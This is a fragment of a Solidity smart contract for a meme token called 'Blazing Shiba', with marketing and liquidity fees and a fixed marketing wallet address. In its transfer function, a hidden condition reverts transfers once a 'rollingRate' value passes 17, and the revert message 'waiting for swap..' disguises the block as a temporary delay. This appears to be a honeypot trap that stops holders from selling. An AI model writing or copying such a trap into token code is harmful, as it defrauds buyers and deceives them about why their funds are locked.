...
contract BlazingShiba is Context, IERC20, Ownable {
    ...
    string private constant _name = "Blazing Shiba"; // 
    string private constant _symbol = "BLAZESHIB"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 4;
    uint256 public _liquidityFee = 4;
    address public  _marketingWallet = 0x8Cac89ecE05893534129bf52Ce5116017060BFFD;
    ...
    function _transfer(
        ...
        {
                if(rollingRate>17){
                if (amount >= _marketingFee)
			    revert("waiting for swap..");
            }
		}
